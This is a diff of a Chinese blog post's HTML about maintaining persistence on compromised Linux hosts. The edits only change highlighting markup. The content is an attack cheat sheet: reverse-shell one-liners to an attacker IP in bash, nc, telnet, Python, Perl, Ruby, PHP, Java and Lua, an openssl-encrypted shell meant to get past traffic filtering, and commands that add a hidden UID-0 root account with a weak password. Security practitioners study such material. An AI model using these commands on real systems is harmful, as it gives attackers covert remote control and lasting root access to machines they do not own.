@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.v4ler1an.com\/2020\/12\/backdoor\/"
-        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "Linux","wordcount":  5374 ,
+        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "Linux","wordcount":  5380 ,
         "url": "https:\/\/www.v4ler1an.com\/2020\/12\/backdoor\/","datePublished": "2020-12-04T21:57:40+08:00","dateModified": "2020-12-05T16:45:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
@@ -124,7 +124,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Linux 下的权限维持</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>有毒</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>Misc</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-04">2020-12-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5374 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-04">2020-12-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5380 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;<span id="/2020/12/backdoor/" class="leancloud_visitors" data-flag-title="Linux 下的权限维持">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                     </span>&nbsp;</div>
@@ -199,19 +199,17 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lvvp port
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvvp port
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>目标执行：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/x.x.x.x/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/x.x.x.x/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>或者</p>
 <div class="highlight"><div class="chroma">
@@ -219,8 +217,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;<span class="p">&amp;</span><span class="m">5</span> 1&gt;<span class="p">&amp;</span><span class="m">5</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;<span class="p">&amp;</span><span class="m">5</span> 1&gt;<span class="p">&amp;</span><span class="m">5</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li><code>bash -i</code>：打开一个交互的bash</li>
@@ -237,8 +235,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lv port1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lv port1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>和</p>
 <div class="highlight"><div class="chroma">
@@ -246,8 +244,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nv -lv port2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nv -lv port2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>目标主机执行：</p>
 <div class="highlight"><div class="chroma">
@@ -255,8 +253,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">telent x.x.x.x port1 <span class="p">|</span> /bin/bash <span class="p">|</span> telnet x.x.x.x port2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">telent x.x.x.x port1 <span class="p">|</span> /bin/bash <span class="p">|</span> telnet x.x.x.x port2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。</p>
 <p>第二种：</p>
@@ -266,8 +264,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lv port
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lv port
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>目标主机执行：</p>
 <div class="highlight"><div class="chroma">
@@ -275,8 +273,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">rm -f /tmp/a<span class="p">;</span>mknod /tmp/a p<span class="p">;</span>telnet x.x.x.x port 0&lt;/tmp/a <span class="p">|</span> /bin/bash 1&gt;tmp/a
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -f /tmp/a<span class="p">;</span>mknod /tmp/a p<span class="p">;</span>telnet x.x.x.x port 0&lt;/tmp/a <span class="p">|</span> /bin/bash 1&gt;tmp/a
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中x.x.x.x为攻击机ip。</p>
 <h4 id="3-ncnetcat反弹">3. nc(netcat)反弹</h4>
@@ -286,8 +284,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lv port
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lv port
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>目标执行：</p>
 <div class="highlight"><div class="chroma">
@@ -295,8 +293,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -e /bin/bash x.x.x.x port
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -e /bin/bash x.x.x.x port
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果目标上没有<code>-e</code>参数可以使用以下命令：</p>
 <div class="highlight"><div class="chroma">
@@ -304,8 +302,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">rm -f /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f <span class="p">|</span> /bin/bash -i 2&gt;<span class="nv">$1</span> <span class="p">|</span> nc x.x.x.x port &gt;/tmp/f
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -f /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f <span class="p">|</span> /bin/bash -i 2&gt;<span class="nv">$1</span> <span class="p">|</span> nc x.x.x.x port &gt;/tmp/f
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>mkfifo</code>的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。</p>
 <p>此外，也可以使用telnet的监听2个端口的方式：</p>
@@ -314,8 +312,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc x.x.x.x port1 <span class="p">|</span> /bin/bash <span class="p">|</span> nc x.x.x.x port2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc x.x.x.x port1 <span class="p">|</span> /bin/bash <span class="p">|</span> nc x.x.x.x port2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="4-常见脚本反弹">4. 常见脚本反弹</h4>
 <p>下述脚本均需要现在攻击机上开启监听：<code>nc -lv port</code>，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。</p>
@@ -325,8 +323,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;x.x.x.x&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;x.x.x.x&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="2-perl">2. Perl</h5>
 <ol>
@@ -337,8 +335,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"> <span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&#34;x.x.x.x&#34;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"> <span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&#34;x.x.x.x&#34;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -348,8 +346,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"> <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;x.x.x.x:port&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"> <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;x.x.x.x:port&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ol>
@@ -362,8 +360,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;x.x.x.x&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exit if fork;c=TCPSocket.new(&#34;x.x.x.x&#34;,&#34;port&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -373,8 +371,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&#34;x.x.x.x&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&#34;x.x.x.x&#34;,port).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ol>
@@ -384,8 +382,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;x.x.x.x&#34;,port);exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;x.x.x.x&#34;,port);exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="5-java">5. Java</h5>
 <div class="highlight"><div class="chroma">
@@ -405,20 +403,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Revs</span> <span class="o">{</span>
-    <span class="cm">/**
-</span><span class="cm">    * @param args
-</span><span class="cm">    * @throws Exception 
-</span><span class="cm">    */</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-        <span class="c1">// TODO Auto-generated method stub
-</span><span class="c1"></span>        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
-        <span class="n">String</span> <span class="n">cmd</span><span class="o">[]=</span> <span class="o">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span><span class="s">&#34;-c&#34;</span><span class="o">,</span><span class="s">&#34;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">};</span>
-        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
-        <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Revs</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * @param args
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * @throws Exception 
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// TODO Auto-generated method stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">cmd</span><span class="o">[]=</span> <span class="o">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span><span class="s">&#34;-c&#34;</span><span class="o">,</span><span class="s">&#34;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="6-lua">6. Lua</h5>
 <div class="highlight"><div class="chroma">
@@ -426,8 +424,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;port&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl"><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;port&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="3-其他方法">3. 其他方法</h4>
 <h5 id="1-socat">1. socat</h5>
@@ -437,8 +435,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> tcp-listen:port
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> tcp-listen:port
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>上传socat到目标主机，然后执行：</p>
 <div class="highlight"><div class="chroma">
@@ -446,8 +444,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setid,sigint,sane tcp x.x.x.x:port
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setid,sigint,sane tcp x.x.x.x:port
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="2-只有80和443端口且反弹shell流量被拦截">2. 只有80和443端口且反弹shell流量被拦截</h5>
 <p>方法论：加密流程，绕过拦截</p>
@@ -457,8 +455,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Step 2：VPN监听反弹shell</p>
 <div class="highlight"><div class="chroma">
@@ -466,8 +464,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">openssl s_server -quiet  -key key.pem -cert cert.pem -port <span class="m">443</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openssl s_server -quiet  -key key.pem -cert cert.pem -port <span class="m">443</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Step 3：连接</p>
 <div class="highlight"><div class="chroma">
@@ -475,8 +473,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkfifo /tmp/v4ler1an<span class="p">;</span>/bin/bash -i &lt; /tmp/v4ler1an 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span>openssl s_client -quiet -connect x.x.x.x:443 &gt; /tmp/v4ler1an
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/v4ler1an<span class="p">;</span>/bin/bash -i &lt; /tmp/v4ler1an 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span>openssl s_client -quiet -connect x.x.x.x:443 &gt; /tmp/v4ler1an
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>此时的shell存在缺陷（无法命令补全等），通过以下方法修复：</p>
 <div class="highlight"><div class="chroma">
@@ -484,8 +482,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>pty</code>是一个伪终端模块。<code>pty.spawn(argv[, master_read[, stdin_read]])</code>产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。
 在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值</p>
@@ -508,19 +506,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 创建一个用户名guest，密码为123456的普通用户</span>
-
-useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#39;salt&#39;</span> 123456<span class="sb">`</span> guest
-
-<span class="c1"># useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。</span>
-useradd -p <span class="s2">&#34;</span><span class="k">$(</span>openssl passwd -1 123456<span class="k">)</span><span class="s2">&#34;</span> guest
-
-<span class="c1"># chpasswd方法</span>
-useradd guest<span class="p">;</span><span class="nb">echo</span> <span class="s1">&#39;guest:123456&#39;</span><span class="p">|</span>chpasswd
-
-<span class="c1"># echo -e方法</span>
-useradd guest<span class="p">;</span><span class="nb">echo</span> -e <span class="s2">&#34;123456\n123456\n&#34;</span> <span class="p">|</span>passwd guest
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 创建一个用户名guest，密码为123456的普通用户</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#39;salt&#39;</span> 123456<span class="sb">`</span> guest
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。</span>
+</span></span><span class="line"><span class="cl">useradd -p <span class="s2">&#34;</span><span class="k">$(</span>openssl passwd -1 123456<span class="k">)</span><span class="s2">&#34;</span> guest
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># chpasswd方法</span>
+</span></span><span class="line"><span class="cl">useradd guest<span class="p">;</span><span class="nb">echo</span> <span class="s1">&#39;guest:123456&#39;</span><span class="p">|</span>chpasswd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># echo -e方法</span>
+</span></span><span class="line"><span class="cl">useradd guest<span class="p">;</span><span class="nb">echo</span> -e <span class="s2">&#34;123456\n123456\n&#34;</span> <span class="p">|</span>passwd guest
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>添加root用户：</p>
 <div class="highlight"><div class="chroma">
@@ -529,9 +527,9 @@ useradd guest<span class="p">;</span><span class="nb">echo</span> -e <span class
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 创建一个用户名为guest，密码为123456的root用户</span>
-useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#39;salt&#39;</span> 123456<span class="sb">`</span> guest -o -u <span class="m">0</span> -g root -G root -s /bin/bash -d /home/guest
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 创建一个用户名为guest，密码为123456的root用户</span>
+</span></span><span class="line"><span class="cl">useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#39;salt&#39;</span> 123456<span class="sb">`</span> guest -o -u <span class="m">0</span> -g root -G root -s /bin/bash -d /home/guest
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>排查方法：</p>
 <div class="highlight"><div class="chroma">
@@ -544,13 +542,13 @@ useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#3
 </span><span class="lnt">6
 </span></code></pre></td>
